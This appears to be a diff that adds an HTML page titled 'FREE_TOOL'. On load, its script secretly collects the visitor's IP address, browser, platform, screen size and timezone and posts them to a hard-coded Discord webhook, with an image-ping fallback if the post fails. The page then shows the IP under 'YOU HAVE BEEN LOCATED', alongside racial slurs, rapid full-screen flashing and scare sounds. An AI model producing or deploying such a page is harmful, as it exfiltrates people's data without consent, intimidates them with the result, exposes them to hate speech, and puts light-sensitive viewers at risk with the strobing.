@@ -1,0 +1,339 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE_TOOL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: white;
+            color: white;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            transition: background 0.08s ease;
+        }
+
+        .container {
+            text-align: center;
+            z-index: 10;
+            position: relative;
+        }
+
+        .ip-display {
+            font-size: 4rem;
+            font-weight: bold;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.8), 0 0 60px red;
+            letter-spacing: 5px;
+            animation: flicker 0.1s infinite alternate;
+        }
+
+        .title {
+            font-size: 2rem;
+            margin-top: 2rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px red;
+            letter-spacing: 8px;
+            animation: glitch 0.3s infinite;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(3px, -3px); }
+            60% { transform: translate(-2px, -1px); }
+            80% { transform: translate(2px, 1px); }
+            100% { transform: translate(0); }
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.15) 2px,
+                rgba(0, 0, 0, 0.15) 4px
+            );
+        }
+
+        .noise {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 998;
+            opacity: 0.05;
+            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="%23fff"/><rect x="0" y="0" width="1" height="1" fill="%23000"/><rect x="2" y="1" width="1" height="1" fill="%23000"/><rect x="1" y="3" width="1" height="1" fill="%23000"/><rect x="3" y="2" width="1" height="1" fill="%23000"/></svg>');
+            background-repeat: repeat;
+        }
+
+        .subtitle {
+            margin-top: 1.5rem;
+            font-size: 1rem;
+            color: #880000;
+            animation: flicker 0.5s infinite alternate;
+        }
+
+        .debug-info {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            font-size: 11px;
+            color: #333;
+            z-index: 1000;
+            background: rgba(0,0,0,0.7);
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: none;
+            text-align: left;
+            max-width: 400px;
+            word-break: break-all;
+        }
+
+        .debug-info.visible {
+            display: block;
+        }
+
+        .debug-info .success { color: #00ff00; }
+        .debug-info .error { color: #ff4444; }
+        .debug-info .label { color: #888; }
+    </style>
+</head>
+<body>
+    <div class="scanline"></div>
+    <div class="noise"></div>
+
+    <div class="container">
+        <div class="ip-display" id="ip">0.0.0.0</div>
+        <div class="title">Spongebob_ABi fucked you nigga </div>
+        <div class="subtitle">YOU HAVE BEEN LOCATED</div>
+    </div>
+
+    <div class="debug-info" id="debug">
+        <div class="label">[DEBUG]</div>
+        <div id="debug-status">Warte auf Besucher...</div>
+    </div>
+
+    <script>
+      
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1507797686143684738/NYnUHj1lj5EQCSjDHyXL3YEntklQVwz2KEXVOLXCL3CsH5CJw6PLuyNfS4HbaufDDqIf';
+        const DEBUG = true; 
+
+      
+        function debugLog(msg, type) {
+            const el = document.getElementById('debug-status');
+            if (!el) return;
+            const prefix = type === 'success' ? '✓' : type === 'error' ? '✗' : '→';
+            const cls = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
+            el.innerHTML = `<span class="${cls}">${prefix}</span> ${msg}`;
+            if (DEBUG) {
+                document.getElementById('debug').classList.add('visible');
+                console.log(`[Spongebob_Abi ${msg}`);
+            }
+        }
+
+    
+        debugLog('Hole IP-Adresse...');
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => {
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                return res.json();
+            })
+            .then(data => {
+                const ip = data.ip;
+                document.getElementById('ip').textContent = ip;
+                debugLog('IP gefunden: ' + ip);
+
+                // Infos sammeln
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const timestamp = new Date().toLocaleString('de-DE');
+                const screenRes = screen.width + 'x' + screen.height;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                debugLog('Sende an Discord...');
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '@everyone **Nigger gefickt !**',
+                        embeds: [{
+                            title: '📍 Standortdaten',
+                            color: 0xff0000,
+                            fields: [
+                                { name: 'IP-Adresse', value: ip, inline: true },
+                                { name: 'Browser', value: userAgent.substring(0, 100), inline: false },
+                                { name: 'Sprache', value: language, inline: true },
+                                { name: 'Plattform', value: platform, inline: true },
+                                { name: 'Bildschirm', value: screenRes, inline: true },
+                                { name: 'Zeitzone', value: timezone, inline: true },
+                                { name: 'Timestamp', value: timestamp, inline: false }
+                            ],
+                            footer: { text: 'Github-TwilightTerror' },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                })
+                .then(response => {
+                    if (response.status === 204 || response.status === 200) {
+                        debugLog('Webhook erfolgreich gesendet! (Status ' + response.status + ')', 'success');
+                    } else {
+                        debugLog('Webhook Status: ' + response.status, 'error');
+                    }
+                })
+                .catch(err => {
+                    debugLog('Webhook fehlgeschlagen: ' + err.message, 'error');
+                   
+                    const img = new Image();
+                    img.src = WEBHOOK_URL + '?content=' + encodeURIComponent('IP: ' + ip);
+                    debugLog('Fallback Image-Ping gesendet', 'error');
+                });
+            })
+            .catch(err => {
+                document.getElementById('ip').textContent = '127.0.0.1';
+                debugLog('IP-Fetch fehlgeschlagen: ' + err.message, 'error');
+            });
+
+        let audioCtx = null;
+
+        function initAudio() {
+            if (audioCtx) return;
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            debugLog('Audio gestartet');
+
+            playDrone();
+            setInterval(() => {
+                if (Math.random() < 0.4) playScareSound();
+            }, 2000);
+        }
+
+        function playDrone() {
+            if (!audioCtx) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            const filter = audioCtx.createBiquadFilter();
+
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(55, audioCtx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(60, audioCtx.currentTime + 2);
+            osc.frequency.exponentialRampToValueAtTime(50, audioCtx.currentTime + 4);
+
+            filter.type = 'lowpass';
+            filter.frequency.setValueAtTime(300, audioCtx.currentTime);
+            filter.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 3);
+
+            gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.08, audioCtx.currentTime + 3);
+
+            osc.connect(filter);
+            filter.connect(gain);
+            gain.connect(audioCtx.destination);
+
+            osc.start();
+            osc.stop(audioCtx.currentTime + 4);
+
+            osc.onended = () => {
+                setTimeout(playDrone, 500);
+            };
+        }
+
+        function playScareSound() {
+            if (!audioCtx) return;
+            const bufferSize = audioCtx.sampleRate * 0.15;
+            const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+            const data = buffer.getChannelData(0);
+
+            for (let i = 0; i < bufferSize; i++) {
+                data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (bufferSize * 0.15));
+            }
+
+            const source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+
+            const gain = audioCtx.createGain();
+            gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
+
+            source.connect(gain);
+            gain.connect(audioCtx.destination);
+            source.start();
+        }
+
+        const body = document.body;
+
+        setInterval(() => {
+            const mode = Math.floor(Math.random() * 4);
+
+            switch(mode) {
+                case 0:
+                    body.style.background = '#ffffff';
+                    body.style.color = '#000000';
+                    break;
+                case 1:
+                    body.style.background = '#ff0000';
+                    body.style.color = '#ffffff';
+                    break;
+                case 2:
+                    body.style.background = '#000000';
+                    body.style.color = '#ff0000';
+                    break;
+                case 3:
+                    body.style.background = '#1a0000';
+                    body.style.color = '#ff3333';
+                    break;
+            }
+
+            if (Math.random() < 0.3) {
+                setTimeout(() => {
+                    body.style.background = '#000000';
+                    body.style.color = '#ff0000';
+                }, 60);
+            }
+            if (Math.random() < 0.2) {
+                setTimeout(() => {
+                    body.style.background = '#ffffff';
+                    body.style.color = '#000000';
+                }, 120);
+            }
+        }, 180);
+
+        
+        document.addEventListener('click', () => {
+            initAudio();
+        });
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                try { initAudio(); } catch(e) {}
+            }, 500);
+        });
+    </script>
+</body>
+</html>
